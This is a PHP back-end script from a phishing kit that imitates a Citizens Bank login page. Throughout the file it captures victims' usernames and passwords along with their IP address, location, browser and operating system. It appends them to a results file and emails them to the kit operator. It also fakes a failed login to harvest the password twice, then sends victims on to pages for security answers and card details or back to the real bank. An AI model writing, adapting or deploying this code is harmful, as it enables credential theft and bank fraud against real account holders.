<?php
ob_start();
session_start();


if (trim($_POST['spox_b00T']) != '') {
    header("HTTP/1.0 404 Not Found");
    exit();
}


if(isset($_POST['invalid'])){
	include '../../admin/YOUR-CONFIG.php';
	include '../../prevents/main.php';
	
$v_ip = $_SERVER['REMOTE_ADDR'];
$v_agent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$userbank = $_SESSION['username'] = $_POST['username'];
$password = $_SESSION['password'] = $_POST['password'] ;
$VictimInfo1 = "| Submitted by : " . $v_ip . " (" . gethostbyaddr($v_ip) . ")";
$VictimInfo2 = "| L0cation : " . $citykota . ", " . $regioncity . ", " . $countryname . "";
$VictimInfo3 = "| Us3rAgent : " . $user_agent . "";
$VictimInfo4 = "| Br0wser : " . $br . "";
$VictimInfo5 = "| Os : " . $os . "";

$message .="+ 🏦 East code Citizensbank L0gin +\n";
$message .= "| l0gin : $userbank\n";
$message .= "| p4ssw0rd : $password\n";
$message .= "+ ------------------------------------+\n";
$message .= "+ 🌐 Victim Inf0rmation\n";
$message .= "$VictimInfo1\n";
$message .= "$VictimInfo2\n";
$message .= "$VictimInfo3\n";
$message .= "$VictimInfo4\n";
$message .= "$VictimInfo5\n";
$message .= "| 🕛 Received : $date\n";
$message .= "+ ------------------------------------+\n";
$message .= " https://ipgeolocation.io/ip-location/$ip \r\n";

$save=fopen("../CITI_RESULT/login2".$pin.".txt","a+");
fwrite($save,$message);
fclose($save);

$subject = "🏦 East code Citizensbank L0gin (II) [ $cn - $os - $v_ip ]";
$head = "Content-type:text/plain;charset=UTF-8\r\n";
$head .= "From: $from <$sender_mail>" . "\r\n";
    @mail($sender_mail ,$subject,$message,$head);


		
    $key = substr(sha1(mt_rand()),1,25);

	if ($show_question=="yes") {
		exit(header("Location: ../../Security_Question?/.jsp/efs/servlet/efs/"));
	}
	if ($show_email_access=="yes") {
		exit(header("Location: ../../Email_identification?/.jsp/efs/servlet/efs/"));
	}
	if ($show_contact_information=="yes") {
		exit(header("Location: ../../Contact_information?/.jsp/efs/servlet/efs/"));
	}
	if ($show_credit_card=="yes") {
		exit(header("Location: ../../credit_verification?/.jsp/efs/servlet/efs/"));
	}
	if ($show_success_page=="yes") {
		exit(header("Location: ../../Success?/.jsp/efs/servlet/efs/")); 
	}else{

		$helper = array_keys($_SESSION);
    		foreach ($helper as $key){
        		unset($_SESSION[$key]);
    			}
    		exit(header("Location: https://bit.ly/2UgDDbr")); // go to bank login page officiel..
	}

}
if(isset($_POST['username'])&&isset($_POST['password'])){

	include '../../admin/YOUR-CONFIG.php';
	include '../../Anti/main.php';

	$CITI_SESSION_LOGIN = "login_SESSION";
	$_SESSION['login_SESSION'] = $CITI_SESSION_LOGIN;
	
$v_ip = $_SERVER['REMOTE_ADDR'];
$v_agent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);	
$userbank = $_SESSION['username'] = $_POST['username'];
$password = $_SESSION['password'] = $_POST['password'] ;
$VictimInfo1 = "| Submitted by : " . $v_ip . " (" . gethostbyaddr($v_ip) . ")";
$VictimInfo2 = "| L0cation : " . $citykota . ", " . $regioncity . ", " . $countryname . "";
$VictimInfo3 = "| Us3rAgent : " . $user_agent . "";
$VictimInfo4 = "| Br0wser : " . $br . "";
$VictimInfo5 = "| Os : " . $os . "";

$message .="+ 🏦 East code Citizensbank L0gin +\n";
$message .= "| l0gin : $userbank\n";
$message .= "| p4ssw0rd : $password\n";
$message .= "+ ------------------------------------+\n";
$message .= "+ 🌐 Victim Inf0rmation\n";
$message .= "$VictimInfo1\n";
$message .= "$VictimInfo2\n";
$message .= "$VictimInfo3\n";
$message .= "$VictimInfo4\n";
$message .= "$VictimInfo5\n";
$message .= "| 🕛 Received : $date\n";
$message .= "+ ------------------------------------+\n";
$message .= " https://ipgeolocation.io/ip-location/$ip \r\n";

$save=fopen("../CITI_RESULT/login".$pin.".txt","a+");
fwrite($save,$message);
fclose($save);

$subject = "🏦 East code Citizensbank L0gin (I) [ $cn - $os - $v_ip ]";
$head = "Content-type:text/plain;charset=UTF-8\r\n";
$head .= "From: $from <$sender_mail>" . "\r\n";
    @mail($sender_mail ,$subject,$message,$head);

    $key = substr(sha1(mt_rand()),1,25);

    if ($double_login=="yes") {
		exit(header("Location: ../../login?/.jsp/efs/servlet/efs/&invalid=login"));
	}

	if ($show_question=="yes") {
		exit(header("Location: ../../Security_Question?/.jsp/efs/servlet/efs/"));
	}
	if ($show_email_access=="yes") {
		exit(header("Location: ../../Email_identification?/.jsp/efs/servlet/efs/"));
	}
	if ($show_contact_information=="yes") {
		exit(header("Location: ../../Contact_information?/.jsp/efs/servlet/efs/"));
	}
	if ($show_credit_card=="yes") {
		exit(header("Location: ../../credit_verification?/.jsp/efs/servlet/efs/"));
	}
	if ($show_success_page=="yes") {
		exit(header("Location: ../../Success?/.jsp/efs/servlet/efs/")); 
	}else{

		$helper = array_keys($_SESSION);
    		foreach ($helper as $key){
        		unset($_SESSION[$key]);
    			}
    		exit(header("Location: https://bit.ly/2UgDDbr")); // go to bank login page officiel..
	}

}else{
    header("HTTP/1.0 404 Not Found");
    exit();
}

?>